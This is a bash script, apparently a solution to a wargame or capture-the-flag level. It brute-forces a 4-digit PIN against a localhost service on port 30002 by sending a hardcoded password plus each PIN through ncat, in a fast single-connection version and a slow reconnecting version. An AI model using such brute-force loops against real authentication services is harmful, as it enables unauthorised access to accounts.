#!/bin/bash

#make var password
#var_pwd="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

# 4-digit pincode. 10000 combinations
# != Wrong! Please enter the correct current password and pincode. Try again.

#xyzk
#устанавлмваем соединеие

#for x in {0..9}; do
#    for y in {0..9}; do
#        for z in {0..9}; do
#            for k in {0..9}; do
#                echo "X  =$var_pwd    $x$y$z$k"
#            done
#        done
#    done
#done
#var_pwd="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
#for i in {0000..9999}; do
#    echo  "check pwd -> $var_pwd $i"
#    response=$(echo  "$var_pwd $i" | timeout 5 ncat localhost 30002)
#    if $response
#done


echo "hello"
var_pwd="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

coproc NC { ncat localhost 30002; }

# читаем приветствие (1 строка)
read -r banner <&"${NC[0]}"
echo "$banner"
sleep 3
for i in {0000..9999}; do
    echo "check pwd -> $var_pwd $i"

    # отправляем данные в то же соединение
    echo "$var_pwd $i" >&"${NC[1]}"

    # читаем ответ
    read -r response <&"${NC[0]}"

    if ! echo "$response" | grep -q "Wrong"; then
        echo "FOUND: $var_pwd $i"
        echo "$response"


        # читаем ответ
        read -r response <&"${NC[0]}"
         echo "$response"
        break
    fi
done

# Завершаем
kill ${NC_PID} 2>/dev/null
wait ${NC_PID} 2>/dev/null 2>&1
unset NC NC_PID



#медленный
# с пересозданием соединения
var_pwd="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

for i in {0000..9999}; do
    echo "check pwd -> $var_pwd $i"

    response=$(echo "$var_pwd $i" | timeout 5 ncat localhost 30002)

    if ! echo "$response" | grep -q "Wrong"; then
        echo "FOUND: $var_pwd $i"
        echo "$response"
        break
    fi
done














